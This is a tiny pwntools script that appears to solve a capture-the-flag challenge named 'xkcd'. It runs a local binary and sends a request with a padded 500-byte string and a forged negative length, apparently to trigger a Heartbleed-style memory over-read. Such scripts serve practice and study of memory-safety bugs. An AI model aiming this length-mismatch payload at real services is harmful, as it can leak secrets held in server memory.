#!/usr/bin/python3

from pwn import *

r = process('/home/user/ctf_dump/weekly_pwnable/week1/xkcd')
r.sendline('SERVER, ARE YOU STILL THERE? IF SO, REPLY "{}" ({} LETTERS)'.format("A"*500, -15))
print(r.recvline())
